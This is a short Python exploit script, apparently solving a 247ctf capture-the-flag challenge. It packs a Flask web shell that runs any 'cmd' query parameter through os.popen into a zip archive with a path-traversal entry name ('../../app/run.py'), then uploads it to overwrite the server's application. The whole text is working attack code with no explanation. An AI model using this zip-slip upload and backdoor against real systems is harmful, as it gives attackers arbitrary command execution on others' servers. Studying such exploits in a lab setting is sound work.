import requests
import zipfile
'''
content.py

from flask import Flask, request
import zipfile, os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(32)

@app.route('/')
def rce():
    if "cmd" in request.args:
        return os.popen(request.args.get("cmd")).read()
    else:
        return "Please insert command"
'''
with zipfile.ZipFile("res.zip", "w") as myzip:
    myzip.write("content.py", "../../app/run.py")
r = requests.post("https://be666a789d492f88.247ctf.com/zip_upload",  files={'zarchive': ('res.zip', open('res.zip', 'rb'), 'application/octet-stream')})
print(r.text)
